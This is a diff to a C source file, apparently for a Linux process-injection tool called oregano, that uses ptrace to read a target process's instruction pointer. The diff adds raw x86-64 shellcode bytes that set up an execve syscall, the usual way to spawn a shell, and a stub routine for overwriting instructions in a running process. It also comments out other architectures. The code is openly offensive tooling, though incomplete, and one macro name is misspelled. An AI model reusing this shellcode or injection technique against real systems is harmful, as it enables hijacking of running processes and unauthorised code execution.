@@ -1,7 +1,7 @@
 // oregano.c
 // https://github.com/R-Rothrock/oregano
 
-// Linux only
+// you'd better be running this on Linux...
 
 #include<stdlib.h>
 #include<sys/ptrace.h> /* ptrace() */
@@ -16,21 +16,26 @@
 #define IP_REG RIP
 #define PTR_T u_int64_t
 
-#elif defined(__i836) // amd32
-#define OFFSET -1
-#define IP_REG EIP
-#define PTR_T uint32_t
+static uint8_t shellcode1[] = {0x48, 0xb8};
+static uint8_t shellcode2[] = {0x99, 0x50, 0x54, 0x5f, 0x52, 0x5e, 0x6a, 0x3b, 0x59, 0x0f, 0x05};
 
-#elif defined(__aarch64__) // arm64
-#define OFFSET 1
-#define IP_REG RIP
-#define PTR_T u_int64_t
+//#elif defined(__i836) // amd32
+//#define OFFSET -1
+//#define IP_REG EIP
+//#define PTR_T uint32_t
 
-#elif defined(__arm__) // arm32
-#define OFFSET 1
-#define IP_REG EIP
-#define PTR_T uint32_t
+//#elif defined(__aarch64__) // arm64
+//#define OFFSET 1
+//#define IP_REG RIP
+//#define PTR_T u_int64_t
 
+//#elif defined(__arm__) // arm32
+//#define OFFSET 1
+//#define IP_REG EIP
+//#define PTR_T uint32_t
+
+#else
+#  error unsupported architecture
 #endif
 
 unsigned int get_file_size(char *pathname)
@@ -58,6 +63,14 @@ PTR_T get_ip_reg(pid_t pid)
 {
   long ret = ptrace(PTRACE_PEEKUSER, pid, sizeof(long) * IP_REG);
   return (PTR_T) (ret + OFFSET);
+}
+
+int change_inst(PTR_T location, uint8_t new_inst)
+{
+  /*
+   * Works the same for both .text and .data segments.
+   */
+  return 0;
 }
 
 int main(int argc, char *argv[])
